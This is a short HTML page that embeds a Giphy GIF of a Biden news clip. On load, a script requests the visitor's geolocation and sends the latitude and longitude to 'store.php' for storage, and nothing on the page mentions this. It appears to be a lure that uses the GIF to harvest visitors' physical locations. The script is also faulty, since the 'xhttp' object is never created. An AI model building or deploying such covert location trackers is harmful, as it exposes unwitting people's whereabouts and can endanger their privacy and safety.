<html>
<body onload="getLocation()">

    <iframe src="https://giphy.com/embed/TfIIPTqadLd3U9eoeB" width="480" height="266" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/news-biden-joe-president-TfIIPTqadLd3U9eoeB">via GIPHY</a></p>

<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    
    xhttp.open("GET", "store.php?lat="+position.coords.latitude+"&long="+position.coords.longitude);
    xhttp.send();

  
}
</script>

</body>
</html>
